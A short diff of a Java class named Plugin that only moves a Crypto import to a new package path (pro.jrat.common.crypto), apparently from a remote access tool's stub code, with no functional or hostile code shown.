@@ -7,9 +7,9 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 
+import pro.jrat.common.crypto.Crypto;
 import pro.jrat.stub.utils.Utils;
 
-import com.redpois0n.common.crypto.Crypto;
 
 public class Plugin {
 
